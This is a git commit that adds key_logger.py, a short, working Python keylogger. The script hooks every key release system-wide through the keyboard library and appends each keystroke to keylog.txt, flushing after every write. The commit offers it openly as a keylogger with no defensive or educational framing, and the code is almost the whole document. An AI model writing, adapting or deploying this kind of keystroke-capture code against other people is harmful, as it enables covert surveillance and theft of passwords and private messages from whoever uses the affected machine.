78d8a35029469b94ecf05d20db2bfc2f31e58b76
ItzDuckk <guy.shamir1788@gmail.com>
2025-06-04 17:45:10 +0300

    Initial commit

---
+++ key_logger.py
@@ -0,0 +1,24 @@
+import keyboard
+
+class Keylogger():
+    def __init__(self, log_filename):
+        self.file = open(log_filename,"w")
+
+    def start_log(self):
+        keyboard.on_release(callback=self.callback)
+        keyboard.wait()
+
+    def callback(self, event):
+        button = event.name
+
+        if button == "space":
+            button = " "
+        elif button == "enter":
+            button = "\n"
+            
+        self.file.write(button)
+        self.file.flush()
+
+
+keylogger_object = Keylogger("keylog.txt")
+keylogger_object.start_log()
